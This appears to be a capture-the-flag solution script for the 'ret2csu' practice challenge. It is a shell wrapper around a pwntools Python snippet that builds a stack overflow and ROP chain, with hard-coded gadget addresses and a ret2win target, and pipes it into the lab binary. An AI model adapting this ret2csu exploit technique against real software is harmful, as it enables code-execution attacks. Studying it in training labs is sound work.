#!/bin/sh

python2 -c '
from pwn import *

ovf = "A"*32 + "\x01" + "\x00" * 7
pop_r12_to_r15 = p64(0x0040089c)
relleno = p64(0x41414141)
r12 = p64(0x00600e10)        # r12 = obj.__frame_dummy_init_array_entry
r15 = p64(0xdeadcafebabebeef)
mov_rdx_r15 = p64(0x00400880)
ret2win = p64(0x004007b1)

payload = ovf + pop_r12_to_r15 + r12 + relleno + relleno + r15 + mov_rdx_r15 + relleno + relleno + relleno + relleno + relleno + relleno + relleno + ret2win

print(payload)
' > stdin.bin

cat stdin.bin | ./ret2csu